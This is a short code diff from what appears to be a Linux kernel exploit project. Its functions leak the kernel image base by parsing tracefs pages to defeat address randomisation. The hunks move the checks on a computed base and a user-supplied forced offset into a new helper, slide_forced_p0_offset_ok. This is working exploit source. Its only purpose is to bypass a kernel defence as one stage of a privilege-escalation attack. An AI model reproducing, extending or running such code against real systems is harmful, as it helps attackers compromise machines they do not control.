@@ -1,4 +1,6 @@
 #include "common.h"
+#include "slide_offset_check.h"
+
 
 #include <netinet/in.h>
 #if defined(SLIDE_STACK_WRITER) && \
@@ -82,8 +84,7 @@ static int slide_tracefs_parse_page(
       if (caller >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
         uint64_t base = caller - SLIDE_TRACEFS_WORKER_CALLER_OFF;
         if (base >= KIMAGE_TEXT_BASE &&
-            base <= KIMAGE_TEXT_BASE + 0x1f0000ULL &&
-            (base & 0xffffULL) == 0) {
+            slide_forced_p0_offset_ok(base - KIMAGE_TEXT_BASE)) {
           *base_out = base;
           return 1;
         }
@@ -2846,8 +2847,8 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+    if (errno || end == forced_offset_arg || *end ||
+        !slide_forced_p0_offset_ok(value)) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
@@ -2928,8 +2929,8 @@ int slide_leak_kernel_base(void) {
     char *end = NULL;
     errno = 0;
     unsigned long long value = strtoull(forced_offset_arg, &end, 0);
-    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
-        (value & 0xffffULL) != 0) {
+    if (errno || end == forced_offset_arg || *end ||
+        !slide_forced_p0_offset_ok(value)) {
       pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
       return 0;
     }
